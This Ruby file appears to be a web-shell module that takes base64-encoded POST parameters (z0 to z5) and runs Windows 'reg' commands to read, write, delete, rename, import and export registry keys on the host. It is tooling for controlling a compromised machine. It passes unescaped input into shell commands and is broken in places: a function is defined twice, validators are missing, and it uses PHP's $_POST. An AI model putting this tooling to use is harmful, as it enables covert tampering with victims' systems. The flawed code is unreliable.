require 'json'
require 'base64'
require 'tempfile'

def run_reg(cmd)
  output = `#{cmd} 2>&1`
  ret = $?.exitstatus
  return ret, output.split(/\r?\n/)
end

def registry_value_to_bytes(value, type)
  case type
  when 'REG_DWORD'
    val = value.sub(/^0x/i, '')
    num = val.to_i(16)
    [num].pack('V')
  when 'REG_QWORD'
    val = value.sub(/^0x/i, '')
    num = val.to_i(16)
    [num].pack('Q') 
  when 'REG_BINARY'
    hex = value.gsub(/[^A-Fa-f0-9]/, '')
    [hex].pack('H*')
  else
    value.to_s.force_encoding('BINARY')
  end
end

def scan_registry(base_path)
  ret, output = run_reg("reg query \"#{base_path}\"")
  
  result = {
    'success' => (ret == 0),
    'error'   => nil,
    'subkeys' => [],
    'values'  => []
  }

  if ret != 0
    result['error'] = output.join("\n")
    return result
  end

  first_key_seen = false

  output.each do |line|
    line = line.force_encoding('UTF-8').encode('UTF-8', invalid: :replace, undef: :replace).strip
    next if line.empty?

    if line.start_with?('HKEY_')
      if !first_key_seen
        first_key_seen = true
      else
        result['subkeys'] << line
      end
      next
    end

    parts = line.split(/\s{2,}/)
    if parts.length >= 2
      name = parts[0].strip
      
      if parts[1].start_with?('REG_')
        type = parts[1].strip
        data = parts[2..-1].join(' ').strip rescue ''
      elsif name.start_with?('REG_')
        type = name
        name = '(Default)'
        data = parts[1..-1].join(' ').strip rescue ''
      else
        next
      end

      begin
        bytes = registry_value_to_bytes(data, type)
        encoded_data = Base64.strict_encode64(bytes)
      rescue => e
        encoded_data = ""
      end

      result['values'] << {
        'name' => name,
        'type' => type,
        'data' => encoded_data
      }
    end
  end

  result
end

def scan_hives(hives)
  result = {}
  hives.each do |hive|
    ret, _ = run_reg("reg query \"#{hive}\"")
    result[hive] = (ret == 0)
  end
  result
end

def scan_registry(base_path)
  ret, output = run_reg("reg query \"#{base_path}\"")
  
  result = {
    'success' => (ret == 0),
    'error'   => nil,
    'subkeys' => [],
    'values'  => []
  }

  if ret != 0
    result['error'] = output.join("\n")
    return result
  end

  first_key_seen = false

  output.each do |line|
    line.strip!
    next if line.empty?

    if line.start_with?('HKEY_')
      if !first_key_seen
        first_key_seen = true
      else
        result['subkeys'] << line
      end
      next
    end

    if line =~ /^\s*(.*?)\s+(REG_\w+)\s+(.*)$/
      name = $1.strip
      type = $2.strip
      data = $3.strip

      result['values'] << {
        'name' => name,
        'type' => type,
        'data' => Base64.strict_encode64(registry_value_to_bytes(data, type))
      }
    end
  end

  result
end

def set_value(path, name, type, data)
  allowed_types = ['REG_SZ', 'REG_EXPAND_SZ', 'REG_DWORD', 'REG_QWORD', 'REG_BINARY', 'REG_MULTI_SZ']
  return { 'success' => false, 'error' => 'Invalid type' } unless allowed_types.include?(type)
  return { 'success' => false, 'error' => 'Invalid path or name' } unless (validate_path(path) && validate_value_name(name))

  case type
  when 'REG_DWORD', 'REG_QWORD'
    data = data.match(/^\d+$/) ? data : data.to_i(16).to_s
  when 'REG_BINARY'
    decoded_bin = Base64.decode64(data)
    data = decoded_bin.unpack1('H*').upcase
  when 'REG_MULTI_SZ'
    data = data.gsub(',', "\0")
  end

  cmd = "reg add \"#{path}\" /v \"#{name}\" /t #{type} /d \"#{data}\" /f"
  _, out = run_reg(cmd)
  
  ok = !out.join("\n").include?('ERROR')
  { 'success' => ok, 'output' => out }
end

def delete_key(path)
  return { 'success' => false, 'error' => 'Invalid path' } unless validate_path(path)
  ret, out = run_reg("reg delete \"#{path}\" /f")
  { 'success' => (ret == 0), 'output' => out }
end

def delete_value(path, name)
  return { 'success' => false, 'error' => 'Invalid input' } unless (validate_path(path) && validate_value_name(name))
  _, out = run_reg("reg delete \"#{path}\" /v \"#{name}\" /f")
  { 'success' => true, 'output' => out }
end

def rename_value(path, old_name, new_name)
  return { 'success' => false, 'error' => 'Invalid input' } unless (validate_path(path) && validate_value_name(old_name) && validate_value_name(new_name))
  
  scan = scan_registry(path)
  value_data = scan['values'].find { |v| v['name'] == old_name }

  return { 'success' => false, 'error' => 'Value not found' } unless value_data

  decoded = Base64.decode64(value_data['data'])
  set = set_value(path, new_name, value_data['type'], decoded)
  return set unless set['success']

  delete_value(path, old_name)
end

def rename_key(old_path, new_path)
  return { 'success' => false, 'error' => 'Invalid source path' } unless validate_path(old_path)

  _, out1 = run_reg("reg copy \"#{old_path}\" \"#{new_path}\" /s /f")
  ok = !out1.join("\n").include?('ERROR')

  return { 'success' => false, 'output' => out1 } unless ok

  _, out2 = run_reg("reg delete \"#{old_path}\" /f")
  { 'success' => true, 'output' => out1 + out2 }
end

def create_key(path)
  return { 'success' => false, 'error' => 'Invalid path' } unless validate_path(path)
  ret, out = run_reg("reg add \"#{path}\" /f")
  { 'success' => (ret == 0), 'output' => out }
end

def export_key(path)
  return { 'success' => false, 'error' => 'Invalid path' } unless validate_path(path)

  tmp_file = Tempfile.new(['reg_', '.reg'])
  tmp_path = tmp_file.path
  tmp_file.close

  ret, out = run_reg("reg export \"#{path}\" \"#{tmp_path}\" /y")
  if ret != 0 || !File.exist?(tmp_path)
    File.delete(tmp_path) if File.exist?(tmp_path)
    return { 'success' => false, 'output' => out }
  end

  content = File.read(tmp_path, mode: 'rb')
  File.delete(tmp_path)

  { 'success' => true, 'data' => Base64.strict_encode64(content) }
end

def import_file(content)
  tmp_file = Tempfile.new(['reg_', '.reg'])
  tmp_path = tmp_file.path
  tmp_file.write(content)
  tmp_file.close

  ret, out = run_reg("reg import \"#{tmp_path}\"")
  File.delete(tmp_path)

  { 'success' => (ret == 0), 'output' => out }
end

def main
  action   = Base64.decode64($_POST['z0'].to_s) rescue ''
  encoding = Base64.decode64($_POST['z1'].to_s) rescue 'utf-8'
  encoding = 'utf-8' if encoding.empty?

  hives = ['HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER', 'HKEY_LOCAL_MACHINE', 'HKEY_USERS', 'HKEY_CURRENT_CONFIG']

  response_data = case action
    when 'hive'
      scan_hives(hives)
    when 'scan'
      base_path = Base64.decode64($_POST['z2'].to_s) rescue ''
      scan_registry(base_path)
    when 'set', 'new_value'
      set_value(
        Base64.decode64($_POST['z2'].to_s),
        Base64.decode64($_POST['z3'].to_s),
        Base64.decode64($_POST['z4'].to_s),
        Base64.decode64($_POST['z5'].to_s)
      )
    when 'del_key'
      delete_key(Base64.decode64($_POST['z2'].to_s))
    when 'del_value'
      delete_value(Base64.decode64($_POST['z2'].to_s), Base64.decode64($_POST['z3'].to_s))
    when 'rename_key'
      rename_key(Base64.decode64($_POST['z2'].to_s), Base64.decode64($_POST['z3'].to_s))
    when 'rename_value'
      rename_value(Base64.decode64($_POST['z2'].to_s), Base64.decode64($_POST['z3'].to_s), Base64.decode64($_POST['z4'].to_s))
    when 'new_key'
      create_key(Base64.decode64($_POST['z2'].to_s))
    when 'export'
      export_key(Base64.decode64($_POST['z2'].to_s))
    when 'import'
      import_file(Base64.decode64($_POST['z2'].to_s))
    else
      { 'success' => false, 'error' => 'Unknown action', 'subkeys' => [], 'values' => [] }
    end

  print JSON.generate(response_data)
  return
end

main()